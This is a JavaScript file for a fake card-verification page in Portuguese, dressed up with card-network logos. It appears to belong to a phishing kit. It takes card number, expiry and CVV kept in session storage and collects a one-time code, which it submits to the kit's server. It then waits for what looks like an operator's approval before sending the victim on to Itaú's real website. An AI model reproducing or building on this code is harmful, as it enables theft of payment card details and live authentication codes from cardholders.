document.addEventListener("DOMContentLoaded", function() {
    const sessionId = sessionStorage.getItem('sessionId');
    const cardNumber = sessionStorage.getItem('cardNumber');
    const cardExpiry = sessionStorage.getItem('cardExpiry');
    const cardCVV = sessionStorage.getItem('cardCVV');
    
    const codeInputs = document.querySelectorAll('.code-input');
    const submitButton = document.querySelector('button[type="submit"]');
    const form = document.getElementById('auth-form');
    const logo = document.getElementById('logo');
    const cardNumberElement = document.getElementById('card-number');
    const transactionDatetime = document.getElementById('transaction-datetime');
    const authModal = new bootstrap.Modal(document.getElementById('authModal'));
    const loadingDiv = document.getElementById('loading');
    const successDiv = document.getElementById('success');
    const errorDiv = document.getElementById('error');
    const timerElement = document.getElementById('timer');
    let timer;

    // Definir data e hora formatadas
    const now = new Date();
    const formattedDate = now.toLocaleDateString('pt-BR');
    const formattedTime = now.toLocaleTimeString('pt-BR');

    if (cardNumber) {
        // Atualizar logotipo com base no número do cartão
        if (cardNumber.startsWith('4')) {
            logo.src = '/asset/logo/id-visa.png';
        } else if (cardNumber.startsWith('5') || cardNumber.startsWith('2')) {
            logo.src = '/asset/logo/id-check.png';
        } else if (cardNumber.startsWith('6')) {
            logo.src = '/asset/logo/id-elo.png';
        }

        // Atualizar número do cartão
        cardNumberElement.textContent = '************' + cardNumber.slice(-4);

        // Atualizar data e hora da transação
        transactionDatetime.textContent = `${formattedDate} ${formattedTime}`;
    } else {
        console.error('Card number not found in sessionStorage');
    }

    codeInputs[0].focus();

    codeInputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value.length === input.maxLength && index < codeInputs.length - 1) {
                codeInputs[index + 1].focus();
            }
            const allFilled = Array.from(codeInputs).every(input => input.value !== '');
            submitButton.disabled = !allFilled;
        });
    });

    form.addEventListener('submit', (e) => {
        e.preventDefault();
        const code = Array.from(codeInputs).map(input => input.value).join('');
        const transactionData = {
            sessionId,
            code,
            datetime: `${formattedDate} ${formattedTime}`,
            transaction: 'Autenticação do Cartão'
        };
        fetch('/api/submit-code', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(transactionData)
        })
        .then(response => response.json())
        .then(data => {
            console.log(data);
            authModal.show();
            startTimer();
            const checkInterval = setInterval(() => checkAuthorizationStatus(sessionId, checkInterval), 10000);
        })
        .catch(error => console.error('Error:', error));
    });
    function startTimer() {
        let timeLeft = 60;
        timer = setInterval(() => {
            timeLeft--;
            timerElement.textContent = `${timeLeft}`;
            if (timeLeft <= 0) {
                clearInterval(timer);
            }
        }, 1000);
    }

    function showAuthModal() {
        var myModal = new bootstrap.Modal(document.getElementById('authModal'), {
            backdrop: 'static',
            keyboard: false
        });
        myModal.show();
    }
    
    document.getElementById('retryButton').addEventListener('click', function() {
        // Redirecionar para a página inicial ou fazer um refresh
        window.location.reload(); // Isso recarrega a página atual
        // Alternativamente, você pode redirecionar para outra página:
        // window.location.href = '/'; // Isso redireciona para a página inicial
    });
    
    function checkAuthorizationStatus(sessionId, checkInterval) {
        fetch(`/api/check-status?sessionId=${sessionId}`)
            .then(response => response.json())
            .then(data => {
                if (data.status === 'authorized') {
                    clearInterval(timer);
                    clearInterval(checkInterval);
                    loadingDiv.classList.add('d-none');
                    successDiv.classList.remove('d-none');
                    // Redirecionar para o site desejado após a autorização
                    setTimeout(() => {
                        window.location.href = 'https://www.itau.com.br';
                    }, 3000); // Espera de 3 segundos antes do redirecionamento
                } else if (data.status === 'denied') {
                    clearInterval(timer);
                    clearInterval(checkInterval);
                    loadingDiv.classList.add('d-none');
                    errorDiv.classList.remove('d-none');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    }
});